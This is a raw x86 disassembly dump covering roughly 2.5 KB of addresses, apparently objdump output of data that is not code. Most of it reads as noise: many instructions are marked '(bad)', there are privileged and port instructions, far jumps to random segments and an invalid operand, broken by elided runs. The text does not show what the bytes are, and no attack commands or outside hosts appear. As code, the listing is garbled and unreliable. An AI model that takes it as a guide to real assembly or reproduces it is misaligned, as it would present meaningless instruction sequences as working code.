  41b643:	imul   eax,esi,0x7a1a2fde
  41b649:	xchg   esp,eax
  41b64a:	mov    BYTE PTR [eax],0x7d
  41b64d:	push   ds
  41b64e:	retf   0x30ec
  41b651:	pop    ebx
  41b652:	and    BYTE PTR fs:[eax+eiz*4],dh
  41b656:	iret   
  41b657:	fwait
  41b658:	cwde   
  41b659:	adc    eax,0x2b9c8434
  41b65e:	(bad)  
  41b65f:	repnz and BYTE PTR [ebp+eax*2-0x3b],0x81
  41b665:	push   cs
  41b666:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b667:	add    al,0x59
  41b669:	ins    BYTE PTR es:[edi],dx
  41b66a:	mov    ah,0x94
  41b66c:	jl     0x41b660
  41b66e:	jge    0x41b655
  41b670:	cmp    eax,0x834075ee
  41b675:	push   ecx
  41b676:	add    ebx,DWORD PTR [esi-0x17]
  41b679:	dec    ebp
  41b67a:	jmp    0x2c4aead7
  41b67f:	jbe    0x41b6fa
  41b681:	adc    ebp,DWORD PTR [eax+0x46f785a3]
  41b687:	rol    DWORD PTR [edi],1
  41b689:	push   ebp
  41b68a:	loope  0x41b664
  41b68c:	imul   esi,DWORD PTR [eax],0x13
  41b68f:	mov    ds:0x61,al
	...
  41b6f4:	test   al,0x63
  41b6f6:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41b6fc:	sti    
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	lods   al,BYTE PTR ds:[esi]
  41b701:	div    BYTE PTR [eax+0x51]
  41b704:	ins    BYTE PTR es:[edi],dx
  41b705:	and    eax,DWORD PTR [ecx]
  41b707:	add    BYTE PTR ds:0xa3000001,al
  41b70d:	shl    DWORD PTR ds:0x6f56efe7,0xc5
  41b714:	adc    ah,ah
  41b716:	adc    esi,DWORD PTR [ebx+0x7a712d59]
  41b71c:	out    dx,eax
  41b71d:	xchg   ebp,eax
  41b71e:	xlat   BYTE PTR ds:[ebx]
  41b71f:	add    DWORD PTR [edx-0x14],edx
  41b722:	inc    edx
  41b723:	adc    esp,esp
  41b725:	jge    0x41b6ea
  41b727:	adc    edx,DWORD PTR [edi]
  41b729:	and    eax,0xfd2dc736
  41b72e:	sub    bh,BYTE PTR [ecx]
  41b730:	push   eax
  41b731:	mov    ds:0x5a5cc6b6,eax
  41b736:	cdq    
  41b737:	fs shr ebx,0x13
  41b73b:	mov    esp,0xcee2b069
  41b740:	mov    al,0x2
  41b742:	stos   BYTE PTR es:[edi],al
  41b743:	popa   
  41b744:	scas   al,BYTE PTR es:[edi]
  41b745:	aaa    
  41b746:	jmp    0xbfde:0x48568da6
  41b74d:	jmp    0xf4d0:0x96ca5ecf
  41b754:	mov    ebp,0xbcffac90
  41b759:	push   cs
  41b75a:	mov    dh,al
  41b75c:	push   edx
  41b75d:	mov    bl,0x6e
  41b75f:	(bad)  [esp+eax*1]
  41b762:	dec    eax
  41b763:	ins    DWORD PTR es:[edi],dx
  41b764:	fwait
  41b765:	adc    al,0x87
  41b767:	xor    al,0x8c
  41b769:	add    al,0xc3
  41b76b:	aam    0xae
  41b76d:	cmp    ecx,eax
  41b76f:	mov    al,ds:0x77e92b69
  41b774:	ins    DWORD PTR es:[edi],dx
  41b775:	sub    DWORD PTR [eax-0x27],edx
  41b778:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b779:	repnz stc 
  41b77b:	cmp    esi,DWORD PTR [edx]
  41b77d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b77e:	hlt    
  41b77f:	mov    ds:0x90bfe494,al
  41b784:	or     eax,0x9cd8a622
  41b789:	cmp    eax,0x62b42dfe
  41b78e:	iret   
  41b78f:	clc    
  41b790:	mov    esp,DWORD PTR [ecx-0x7d]
  41b793:	adc    DWORD PTR [edi],edi
  41b795:	ds inc esp
  41b797:	mov    ch,0xf2
  41b799:	ins    BYTE PTR es:[edi],dx
  41b79a:	dec    esp
  41b79b:	aas    
  41b79c:	sahf   
  41b79d:	sub    eax,0xbbc9e160
  41b7a2:	mov    WORD PTR [ebx+0x38755301],gs
  41b7a8:	jb     0x41b78b
  41b7aa:	push   cs
  41b7ab:	adc    ebx,edx
  41b7ad:	mov    dh,0xf5
  41b7af:	xchg   esp,eax
  41b7b0:	fchs   
  41b7b2:	mov    ds:0x1948f6b8,al
  41b7b7:	fyl2xp1 
  41b7b9:	sete   BYTE PTR [ecx+edi*8-0x3a81dad3]
  41b7c1:	pop    ebx
  41b7c2:	sti    
  41b7c3:	xchg   esi,edi
  41b7c5:	and    BYTE PTR [eax+edi*1-0x2dce358e],0x73
  41b7cd:	inc    ecx
  41b7ce:	in     eax,dx
  41b7cf:	(bad)  
  41b7d0:	inc    ebp
  41b7d1:	push   edx
  41b7d2:	sbb    ah,dl
  41b7d4:	sti    
  41b7d5:	add    ch,ch
  41b7d7:	(bad)  
  41b7d8:	mov    ecx,0x6ced91d0
  41b7dd:	leave  
  41b7de:	je     0x41b7e4
  41b7e0:	stos   BYTE PTR es:[edi],al
  41b7e1:	or     al,0xb4
  41b7e3:	or     cl,BYTE PTR fs:[esi+0x7c]
  41b7e7:	int3   
  41b7e8:	call   0x7a7a7499
  41b7ed:	add    eax,0x64c1a926
  41b7f2:	test   eax,edx
  41b7f4:	xchg   esp,eax
  41b7f5:	js     0x41b7bb
  41b7f7:	mov    al,ds:0x530a3a2d
  41b7fc:	jge    0x41b7da
  41b7fe:	dec    edx
  41b7ff:	hlt    
  41b800:	xchg   DWORD PTR [ebx-0x3d],esi
  41b803:	ret    
  41b804:	add    ebp,DWORD PTR [eax+0x5f]
  41b807:	repz hlt 
  41b809:	or     al,0x9a
  41b80b:	cmp    DWORD PTR [eax+edi*4+0xa1d661],eax
	...
  41b872:	add    BYTE PTR [eax],al
  41b874:	mov    bh,ah
  41b876:	(bad)  
  41b877:	dec    esi
  41b878:	idiv   DWORD PTR [edi-0x75]
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0x93
  41b881:	outs   dx,DWORD PTR ds:[esi]
  41b882:	sbb    DWORD PTR [edi],esp
  41b884:	jno    0x41b8aa
  41b886:	add    DWORD PTR [eax],eax
  41b888:	add    eax,0xe5000001
  41b88d:	sub    ah,cl
  41b88f:	out    0x40,eax
  41b891:	adc    BYTE PTR [esi+0x49],ch
  41b894:	retf   0x3723
  41b897:	in     eax,dx
  41b898:	ret    0xa66
  41b89b:	cwde   
  41b89c:	jae    0x41b829
  41b89e:	scas   eax,DWORD PTR es:[edi]
  41b89f:	push   es
  41b8a0:	imul   edx,DWORD PTR [edx+0x6c498cdf],0x96ba6501
  41b8aa:	or     bh,bh
  41b8ac:	loope  0x41b869
  41b8ae:	cmp    BYTE PTR [eax],0x9b
  41b8b1:	jge    0x41b909
  41b8b3:	sbb    DWORD PTR [ecx-0x11],eax
  41b8b6:	pop    eax
  41b8b7:	jns    0x41b8a6
  41b8b9:	sti    
  41b8ba:	sbb    eax,0x8ecc4b74
  41b8bf:	pushf  
  41b8c0:	push   es
  41b8c1:	push   ds
  41b8c2:	and    BYTE PTR [ebx],ch
  41b8c4:	cwde   
  41b8c5:	or     esp,esp
  41b8c7:	ror    DWORD PTR [eax],0xb7
  41b8ca:	pop    esp
  41b8cb:	leave  
  41b8cc:	ja     0x41b90a
  41b8ce:	pop    ebx
  41b8cf:	shl    BYTE PTR [eax-0x38],0xd0
  41b8d3:	pop    ss
  41b8d4:	aaa    
  41b8d5:	data16 into 
  41b8d7:	add    al,0x77
  41b8d9:	ins    BYTE PTR es:[edi],dx
  41b8da:	nop
  41b8db:	mov    ds:0x5a205d31,al
  41b8e0:	call   0xc846:0x75a1de5c
  41b8e7:	fdiv   QWORD PTR [edx-0x16]
  41b8ea:	retf   
  41b8eb:	pop    ds
  41b8ec:	lahf   
  41b8ed:	adc    bl,BYTE PTR [eax-0x3c]
  41b8f0:	or     eax,0xa18a229d
  41b8f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8f6:	jl     0x41b926
  41b8f8:	sub    eax,0x13186c1b
  41b8fd:	xor    ch,BYTE PTR [edi+0x2b]
  41b900:	mov    ebp,0x86c95ab2
  41b905:	adc    DWORD PTR ds:0x512b6e20,ecx
  41b90b:	dec    ecx
  41b90c:	sbb    BYTE PTR [esi-0x4f8938c3],bl
  41b912:	jne    0x41b96c
  41b914:	pop    esp
  41b915:	ret    0xaf2c
  41b918:	jnp    0x41b983
  41b91a:	jge    0x41b900
  41b91c:	call   0x10c261b
  41b921:	dec    edi
  41b922:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b923:	dec    eax
  41b924:	(bad)  
  41b925:	nop
  41b926:	not    DWORD PTR [ecx+0x15]
  41b929:	out    dx,al
  41b92a:	jecxz  0x41b97a
  41b92c:	jecxz  0x41b941
  41b92e:	mov    eax,ds:0xc0da5979
  41b933:	sub    ch,dh
  41b935:	(bad)  
  41b936:	or     al,0x14
  41b938:	sbb    bh,BYTE PTR [edx+ecx*8-0x20]
  41b93c:	stos   BYTE PTR es:[edi],al
  41b93d:	pop    ds
  41b93e:	xor    eax,0x1b078807
  41b943:	add    eax,0xeee8ea1c
  41b948:	push   esi
  41b949:	and    edx,DWORD PTR [edi+ebp*4+0x60473c99]
  41b950:	lods   al,BYTE PTR ds:[esi]
  41b951:	pop    ss
  41b952:	jl     0x41b91e
  41b954:	fistp  QWORD PTR [esi+ebp*1+0x4b0e2502]
  41b95b:	(bad)  
  41b95c:	int3   
  41b95d:	sbb    al,0xda
  41b95f:	mov    al,0x1d
  41b961:	adc    al,0x5c
  41b963:	fdivr  DWORD PTR [eax+0xeca9276]
  41b969:	jle    0x41b901
  41b96b:	lahf   
  41b96c:	rcl    BYTE PTR [edi-0x4f],1
  41b96f:	lahf   
  41b970:	(bad)  
  41b971:	mov    ebx,0x7a2ab098
  41b976:	aaa    
  41b977:	adc    DWORD PTR [ecx-0x2d9eb647],esp
  41b97d:	jle    0x41b932
  41b97f:	or     BYTE PTR [edi],cl
  41b981:	ss adc eax,0x20af1734
  41b987:	cdq    
  41b988:	ins    BYTE PTR es:[edi],dx
  41b989:	aaa    
  41b98a:	jae    0x41b964
  41b98c:	mov    ch,0x3b
  41b98e:	dec    DWORD PTR [ebx+ebp*8]
	...
  41b9f1:	add    BYTE PTR [eax],al
  41b9f3:	add    bl,al
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	int    0x3
  41ba02:	call   0x500:0x125760b
  41ba09:	add    DWORD PTR [eax],eax
  41ba0b:	add    BYTE PTR [edi+0x29],al
  41ba0e:	push   ss
  41ba0f:	cmp    ah,al
  41ba11:	jno    0x41ba7c
  41ba13:	sub    BYTE PTR [ecx-0x6a],al
  41ba16:	xchg   ecx,eax
  41ba17:	clc    
  41ba18:	aam    0xf4
  41ba1a:	push   esp
  41ba1b:	sub    edx,ebp
  41ba1d:	adc    eax,0xd0a7345e
  41ba22:	loopne 0x41ba3e
  41ba24:	push   ecx
  41ba25:	clc    
  41ba26:	stos   BYTE PTR es:[edi],al
  41ba27:	jbe    0x41ba7f
  41ba29:	mov    ds:0xabcc7f3a,al
  41ba2e:	add    BYTE PTR [edx-0x1b],dl
  41ba31:	jecxz  0x41ba43
  41ba33:	jmp    FWORD PTR [ebp-0x45]
  41ba36:	and    edi,esi
  41ba38:	jnp    0x41ba58
  41ba3a:	mov    esp,eax
  41ba3c:	or     eax,0x325c42be
  41ba41:	xchg   BYTE PTR [ebx-0x27],bh
  41ba44:	cs es sbb esi,ebp
  41ba48:	jbe    0x41b9e4
  41ba4a:	cdq    
  41ba4b:	loope  0x41b9ce
  41ba4d:	sub    eax,0x4e4be742
  41ba52:	call   0x7a3c281c
  41ba57:	sbb    dl,ah
  41ba59:	scas   al,BYTE PTR es:[edi]
  41ba5a:	ror    dl,cl
  41ba5c:	(bad)  
  41ba5d:	fld    DWORD PTR [edx+0x5e2f556e]
  41ba63:	sub    ch,bl
  41ba65:	pop    esi
  41ba66:	jbe    0x41ba0c
  41ba68:	aam    0x44
  41ba6a:	int3   
  41ba6b:	adc    eax,0xa4f525f0
  41ba70:	rcl    eax,1
  41ba72:	out    0x43,al
  41ba74:	push   esi
  41ba75:	xor    eax,0x94eea91d
  41ba7a:	in     al,dx
  41ba7b:	add    ch,BYTE PTR [ebx]
  41ba7d:	mov    al,BYTE PTR [esi-0x18]
  41ba80:	and    ch,BYTE PTR [edx+0xc]
  41ba83:	out    0xba,eax
  41ba85:	das    
  41ba86:	aam    0x27
  41ba88:	lock push ss
  41ba8a:	scas   al,BYTE PTR es:[edi]
  41ba8b:	outs   dx,DWORD PTR ds:[esi]
  41ba8c:	cmc    
  41ba8d:	cmp    BYTE PTR [ebx+eiz*8+0x4f8e6c5f],dl
  41ba94:	(bad)  
  41ba95:	dec    edx
  41ba96:	xor    DWORD PTR [ecx+ebp*4],ebx
  41ba99:	push   0x7cae1f84
  41ba9e:	xchg   esp,eax
  41ba9f:	jae    0x41ba5c
  41baa1:	fstp   DWORD PTR [edi+eiz*4]
  41baa4:	inc    esp
  41baa5:	stc    
  41baa6:	jae    0x41bb23
  41baa8:	sbb    DWORD PTR es:[eax-0x55a5807c],esi
  41baaf:	leave  
  41bab0:	imul   ebp,DWORD PTR [ebx+0x55ab2c1a],0x880f755d
  41baba:	imul   edi,DWORD PTR ss:[ebx],0x31
  41babe:	mov    di,0xacc3
  41bac2:	sbb    DWORD PTR [ebx-0x40],esi
  41bac5:	ja     0x41bb21
  41bac7:	jbe    0x41bb27
  41bac9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41baca:	push   0x3c
  41bacc:	inc    ecx
  41bacd:	jg     0x41baa7
  41bacf:	scas   al,BYTE PTR es:[edi]
  41bad0:	jb     0x41bb4c
  41bad2:	das    
  41bad3:	test   eax,0xda64a628
  41bad8:	sbb    DWORD PTR ds:0x56dc0d0f,ebp
  41bade:	mov    al,0x9a
  41bae0:	push   ds
  41bae1:	mov    ?,WORD PTR [edx]
  41bae3:	jp     0x41bb37
  41bae5:	sbb    BYTE PTR [ebp+edi*8+0x48],0x5
  41baea:	aad    0x59
  41baec:	push   cs
  41baed:	iret   
  41baee:	pop    esi
  41baef:	(bad)  [ebx-0x3167c81b]
  41baf5:	into   
  41baf6:	arpl   WORD PTR [ecx*8+0xb84bb1f],bx
  41bafd:	imul   ebx,DWORD PTR [edi-0x19],0x56
  41bb01:	adc    esp,DWORD PTR [edi+0x13]
  41bb04:	xchg   esi,eax
  41bb05:	push   esi
  41bb06:	shl    BYTE PTR [edx-0x75],cl
  41bb09:	ret    0x264c
  41bb0c:	aad    0x5b
  41bb0e:	adc    cl,bl
  41bb10:	dec    edx
	...
  41bb71:	add    BYTE PTR [eax],al
  41bb73:	add    BYTE PTR [edx],cl
  41bb75:	mov    eax,0xbfb7aaa5
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi+0xd],cx
  41bb81:	inc    eax
  41bb82:	xor    BYTE PTR [eax+0x7b],dh
  41bb85:	add    DWORD PTR es:[eax],eax
  41bb88:	add    eax,0x42000001
  41bb8d:	popa   
  41bb8e:	ins    DWORD PTR es:[edi],dx
  41bb8f:	test   BYTE PTR [ebp-0x42b66fb1],al
  41bb95:	dec    ecx
  41bb96:	xchg   dl,cl
  41bb98:	test   eax,0xb7c035d9
  41bb9d:	arpl   WORD PTR [edi-0x16],bx
  41bba0:	nop
  41bba1:	adc    al,0x9
  41bba3:	ins    BYTE PTR es:[edi],dx
  41bba4:	cs pop ss
  41bba6:	mov    al,0x3f
  41bba8:	lock adc eax,0x7ea52a68
  41bbae:	add    al,0xce
  41bbb0:	cdq    
  41bbb1:	push   ebx
  41bbb2:	push   ds
  41bbb3:	mov    cl,0x90
  41bbb5:	pop    ecx
  41bbb6:	test   BYTE PTR [edi+0x7],cl
  41bbb9:	ins    DWORD PTR es:[edi],dx
  41bbba:	loop   0x41bbba
  41bbbc:	push   es
  41bbbd:	stos   BYTE PTR es:[edi],al
  41bbbe:	push   ss
  41bbbf:	bound  esi,QWORD PTR ds:[edx-0xf]
  41bbc3:	inc    edi
  41bbc4:	pop    esp
  41bbc5:	push   es
  41bbc6:	sub    DWORD PTR [esi-0xf5a6907],0xe5c9a31c
  41bbd0:	xor    al,0xb
  41bbd2:	xchg   esi,eax
  41bbd3:	in     eax,dx
  41bbd4:	lds    eax,FWORD PTR [ecx]
  41bbd6:	inc    ecx
  41bbd7:	inc    eax
  41bbd8:	retf   0x7fa8
  41bbdb:	mov    ch,0xec
  41bbdd:	pop    ds
  41bbde:	jl     0x41bc42
  41bbe0:	int3   
  41bbe1:	out    dx,al
  41bbe2:	jb     0x41bbe9
  41bbe4:	shl    cl,cl
  41bbe6:	jo     0x41bbff
  41bbe8:	mov    BYTE PTR [esi+0x5e50eb73],0x58
  41bbef:	mov    WORD PTR [esi],gs
  41bbf1:	loope  0x41bc35
  41bbf3:	imul   edi,DWORD PTR [eax],0xcef131e0
  41bbf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbfa:	test   BYTE PTR [esi],0xe2
  41bbfd:	dec    edx
  41bbfe:	and    DWORD PTR [ebp+0xb],eax
  41bc01:	mov    DWORD PTR [esi+0x72dbde89],ebp
  41bc07:	sub    esp,DWORD PTR [eax-0x57]
  41bc0a:	xor    bl,BYTE PTR [ebx+esi*4-0xd]
  41bc0e:	imul   ebp,DWORD PTR [esi],0x1b
  41bc11:	sbb    BYTE PTR ds:0x9a549978,bh
  41bc17:	inc    DWORD PTR [esi+0x265b7636]
  41bc1d:	mov    edi,0xf8b180e5
  41bc22:	fstp   QWORD PTR [edx]
  41bc24:	pop    ebp
  41bc25:	cld    
  41bc26:	adc    DWORD PTR [esi+edi*8-0x1d],esp
  41bc2a:	push   0x6c
  41bc2c:	popf   
  41bc2d:	pop    ebx
  41bc2e:	repz popa 
  41bc30:	test   DWORD PTR [ebp-0x4e],edi
  41bc33:	xchg   DWORD PTR [ecx-0x6c],ebx
  41bc36:	div    BYTE PTR [esi+0x50]
  41bc39:	std    
  41bc3a:	push   eax
  41bc3b:	cmp    ch,bh
  41bc3d:	aas    
  41bc3e:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41bc40:	sbb    eax,DWORD PTR [ecx+0x7fb93806]
  41bc46:	mov    edx,0xa186355
  41bc4b:	(bad)  
  41bc4c:	mov    ds:0x465ca29d,eax
  41bc51:	outs   dx,BYTE PTR ds:[esi]
  41bc52:	fld    TBYTE PTR ds:0x1df3283
  41bc58:	(bad)  
  41bc59:	push   ds
  41bc5a:	mov    cl,0xa4
  41bc5c:	rcl    DWORD PTR [ecx],1
  41bc5e:	xor    BYTE PTR [eax+ecx*2-0x2d],al
  41bc62:	pop    ds
  41bc63:	and    DWORD PTR [ecx+0x6e1f5d7e],0xe
  41bc6a:	loope  0x41bcc6
  41bc6c:	dec    ebx
  41bc6d:	add    DWORD PTR [esi-0x6746e22b],ebp
  41bc73:	daa    
  41bc74:	xchg   ebp,eax
  41bc75:	jp     0x41bcbb
  41bc77:	dec    esp
  41bc78:	(bad)  
  41bc79:	fisub  DWORD PTR [eax+0x73e988cd]
  41bc7f:	repz aad 0x6f
  41bc82:	add    ebp,DWORD PTR [esi-0x479c3e76]
  41bc88:	inc    eax
  41bc89:	push   eax
  41bc8a:	repz pop ss
  41bc8c:	mov    bl,0xa7
  41bc8e:	sub    bh,BYTE PTR ds:0x77
	...
  41bcf4:	shl    BYTE PTR [edx],cl
  41bcf6:	cli    
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0x6b6ad9d8
  41bd02:	popa   
  41bd03:	push   eax
  41bd04:	and    BYTE PTR [edi],0x1
  41bd07:	add    BYTE PTR ds:0x61000001,al
  41bd0d:	es ds xor eax,0xe98f62aa
  41bd14:	ja     0x41bcbe
  41bd16:	fsubr  DWORD PTR [ebp-0x7085abd5]
  41bd1c:	jl     0x41bd88
  41bd1e:	sub    ecx,edi
  41bd20:	dec    ebx
  41bd21:	(bad)  
  41bd23:	outs   dx,DWORD PTR ds:[esi]
  41bd24:	mov    ebp,0x4cb58144
  41bd29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd2a:	(bad)  
  41bd2b:	(bad)  
  41bd2c:	lea    edx,[ebx]
  41bd2e:	add    eax,0xac1a43ef
  41bd33:	rcl    DWORD PTR [esi+0x6],cl
  41bd36:	sbb    ecx,0xf671531f
  41bd3c:	rol    dl,cl
  41bd3e:	icebp  
  41bd3f:	and    al,0x8b
  41bd41:	loop   0x41bcf3
  41bd43:	sbb    al,0x15
  41bd45:	sbb    al,0x5
  41bd47:	rcr    BYTE PTR [ebx-0x1954e670],0xad
  41bd4e:	mov    edx,0x1eec4331
  41bd53:	dec    DWORD PTR [ebp-0x3ac0555c]
  41bd59:	rcl    edi,cl
  41bd5b:	jnp    0x41bdac
  41bd5d:	mov    dl,0x3a
  41bd5f:	xchg   ebp,eax
  41bd60:	or     al,0x42
  41bd62:	in     eax,dx
  41bd63:	mov    ch,BYTE PTR [ebx+0x32a9b47e]
  41bd69:	shr    DWORD PTR [eax+0x241a653b],0xb6
  41bd70:	cwde   
  41bd71:	push   cs
  41bd72:	sub    ah,BYTE PTR [eax+0x55]
  41bd75:	xor    BYTE PTR [eax+0x5f8c2819],dl
  41bd7b:	push   eax
  41bd7c:	jno    0x41bdd8
  41bd7e:	(bad)  
  41bd7f:	sar    dh,0xba
  41bd82:	adc    bl,0x12
  41bd85:	lods   al,BYTE PTR ds:[esi]
  41bd86:	in     eax,0x51
  41bd88:	inc    ecx
  41bd89:	and    dh,BYTE PTR [edx-0x4aed87ac]
  41bd8f:	rcr    DWORD PTR [edx],cl
  41bd91:	pop    ss
  41bd92:	pop    ecx
  41bd93:	fsub   QWORD PTR [ecx]
  41bd95:	out    0x7c,al
  41bd97:	push   cs
  41bd98:	or     al,0xff
  41bd9a:	add    al,0x95
  41bd9c:	test   BYTE PTR [eax+0x1d0c402e],bh
  41bda2:	in     eax,0x2c
  41bda4:	popa   
  41bda5:	inc    ebp
  41bda6:	popa   
  41bda7:	xlat   BYTE PTR ds:[ebx]
  41bda8:	ffreep st(6)
  41bdaa:	test   al,0xe0
  41bdac:	pop    ds
  41bdad:	jle    0x41bd67
  41bdaf:	ss (bad) 
  41bdb1:	pop    ecx
  41bdb2:	outs   dx,DWORD PTR ds:[esi]
  41bdb3:	xor    dh,BYTE PTR [ecx-0x9]
  41bdb6:	jp     0x41bd6a
  41bdb8:	stos   DWORD PTR es:[edi],eax
  41bdb9:	xor    ah,ch
  41bdbb:	push   0x72db81e9
  41bdc0:	lods   al,BYTE PTR ds:[esi]
  41bdc1:	(bad)  
  41bdc2:	call   0xfff95cb2
  41bdc7:	idiv   BYTE PTR [edi-0x8]
  41bdca:	or     al,0xd6
  41bdcc:	ds jle 0x41bd73
  41bdcf:	out    0xe5,eax
  41bdd1:	ja     0x41bdd4
  41bdd3:	pop    ebp
  41bdd4:	enter  0x5280,0xf6
  41bdd8:	dec    esi
  41bdd9:	mov    BYTE PTR [ecx-0x5b],bh
  41bddc:	jle    0x41bdc9
  41bdde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bddf:	dec    esi
  41bde0:	add    BYTE PTR [esi+eiz*2],0x66
  41bde4:	test   DWORD PTR [ebx],ecx
  41bde6:	enter  0x2679,0x61
  41bdea:	or     DWORD PTR [edx-0x423cfdec],eax
  41bdf0:	and    edi,ebp
  41bdf2:	dec    esp
  41bdf3:	in     al,0x5c
  41bdf5:	scas   al,BYTE PTR es:[edi]
  41bdf6:	popf   
  41bdf7:	pop    esi
  41bdf8:	adc    edi,DWORD PTR [ebp-0x20]
  41bdfb:	adc    al,0x7c
  41bdfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bdfe:	fsubr  QWORD PTR [edx-0x4e43cacd]
  41be04:	cmp    al,0x63
  41be06:	call   0xbb6a:0xff3bbe64
  41be0d:	and    dl,dh
  41be0f:	jecxz  0x41bdee
	...
  41be71:	add    BYTE PTR [eax],al
  41be73:	add    BYTE PTR [ebp-0x63956373],al
  41be79:	jnp    0x41be72
  41be7b:	out    dx,eax
  41be7c:	mov    ebp,DWORD PTR [ecx-0x617bc09a]
  41be82:	bound  eax,QWORD PTR [ebx]
  41be84:	test   DWORD PTR [eax],ebp
  41be86:	add    DWORD PTR [eax],eax
  41be88:	add    eax,0xe4000001
  41be8d:	lea    esp,[edx+0x22]
  41be90:	jg     0x41bf05
  41be92:	repz cwde 
  41be94:	in     eax,dx
  41be95:	push   esp
  41be96:	add    esp,ebx
  41be98:	gs ds (bad) 
  41be9b:	fdivr  QWORD PTR [edx]
  41be9d:	jae    0x41bef3
  41be9f:	les    ecx,FWORD PTR [edi]
  41bea1:	lock jmp 0x41be24
  41bea4:	add    ch,ch
  41bea6:	push   esp
  41bea7:	cmp    al,0x6b
  41bea9:	mov    ch,0x32
  41beab:	dec    edi
  41beac:	jo     0x41bf14
  41beae:	ds xor eax,0x6be32dff
  41beb4:	js     0x41beee
  41beb6:	cmp    BYTE PTR [ebx],bh
  41beb8:	jo     0x41befa
  41beba:	call   0x26ce3882
  41bebf:	adc    eax,0x8d64d86e
  41bec4:	test   BYTE PTR [eax-0x9],bh
  41bec7:	jmp    0xe1333ba9
  41becc:	dec    edi
  41becd:	pusha  
  41bece:	cld    
  41becf:	out    dx,eax
  41bed0:	sbb    DWORD PTR [ecx],edx
  41bed2:	xchg   ebp,eax
  41bed3:	fwait
  41bed4:	add    al,0x7b
  41bed6:	rcr    ebx,cl
  41bed8:	loop   0x41bf0c
  41beda:	ret    
  41bedb:	xchg   esi,eax
  41bedc:	fs or  bl,dl
  41bedf:	stos   DWORD PTR es:[edi],eax
  41bee0:	or     DWORD PTR [eax+0x2e],0x54d54f19
  41bee7:	mov    ds:0xba5519c3,al
  41beec:	mov    eax,ds:0xf9b191db
  41bef1:	gs stos BYTE PTR es:[edi],al
  41bef3:	xchg   ebp,eax
  41bef4:	add    DWORD PTR [eax],edi
  41bef6:	jge    0x41bf19
  41bef8:	sbb    BYTE PTR [edi+eiz*8],bl
  41befb:	and    al,0xb8
  41befd:	je     0x41bed4
  41beff:	dec    ebp
  41bf00:	adc    BYTE PTR [ebx],0x18
  41bf03:	adc    al,0xb5
  41bf05:	mov    ch,0xe5
  41bf07:	pop    ebp
  41bf08:	push   esi
  41bf09:	dec    edi
  41bf0a:	arpl   WORD PTR [edi+esi*2],di
  41bf0d:	ror    DWORD PTR [ebx+0x18],1
  41bf10:	loopne 0x41bf7d
  41bf12:	ss xor eax,0x53d0a5e5
  41bf18:	fld    TBYTE PTR [bp+di+0x13]
  41bf1c:	mov    esp,0x34a07e58
  41bf21:	(bad)  
  41bf22:	sbb    eax,0xf68b5d23
  41bf27:	fwait
  41bf28:	outs   dx,DWORD PTR ds:[esi]
  41bf29:	adc    al,0x56
  41bf2b:	mov    ebp,0x347ed1bd
  41bf30:	pop    esi
  41bf31:	repz (bad) 
  41bf33:	cmp    eax,0x2157e6be
  41bf38:	mov    ds:0x1739a073,eax
  41bf3d:	sbb    BYTE PTR [ebx],ch
  41bf3f:	rcr    DWORD PTR [edx-0x78],cl
  41bf42:	xor    al,0x9
  41bf44:	push   ebx
  41bf45:	in     eax,dx
  41bf46:	das    
  41bf47:	outs   dx,DWORD PTR ds:[esi]
  41bf48:	pop    ebp
  41bf49:	push   esp
  41bf4a:	jb     0x41bfa1
  41bf4c:	int3   
  41bf4d:	(bad)  
  41bf4e:	cli    
  41bf4f:	dec    edx
  41bf50:	call   0xc1ae:0xc30837ec
  41bf57:	int    0x71
  41bf59:	aad    0x83
  41bf5b:	inc    eax
  41bf5c:	xchg   ebx,eax
  41bf5d:	push   0x729b8c79
  41bf62:	(bad)  
  41bf64:	xor    al,BYTE PTR [edx+0x58d68400]
  41bf6a:	in     eax,0xa
  41bf6c:	adc    dl,BYTE PTR [ebx+0x38]
  41bf6f:	inc    ecx
  41bf70:	or     eax,0x4f79e05a
  41bf75:	and    eax,0x693808fc
  41bf7a:	mov    eax,DWORD PTR [esi-0x3a512feb]
  41bf80:	xor    bh,BYTE PTR [ecx+0x50]
  41bf83:	push   ecx
  41bf84:	mov    eax,0x3cb032da
  41bf89:	cwde   
  41bf8a:	call   0x3331a280
  41bf8f:	pusha  
  41bf90:	push   esi
	...
  41bff1:	add    BYTE PTR [eax],al
  41bff3:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	enter  0x1d27,0xdc
  41c004:	mov    ch,BYTE PTR [ecx]
  41c006:	add    DWORD PTR [eax],eax
  41c008:	add    eax,0xc3000001
  41c00d:	adc    dl,ch
  41c00f:	and    BYTE PTR [esi+0x2257c3ec],dh
  41c015:	xor    eax,0x853ac62e
  41c01a:	dec    esi
  41c01b:	les    edi,FWORD PTR ds:0x87cef246
  41c021:	pop    ecx
  41c022:	jo     0x41c00d
  41c024:	out    dx,al
  41c025:	xor    esp,DWORD PTR [ecx]
  41c027:	clc    
  41c028:	mov    ah,0xcb
  41c02a:	aam    0xaa
  41c02c:	dec    ebx
  41c02d:	sub    al,BYTE PTR [edx-0x4d]
  41c030:	sbb    BYTE PTR [eax+0x88dac76],bl
  41c036:	popf   
  41c037:	icebp  
  41c038:	pop    es
  41c039:	sub    cl,ah
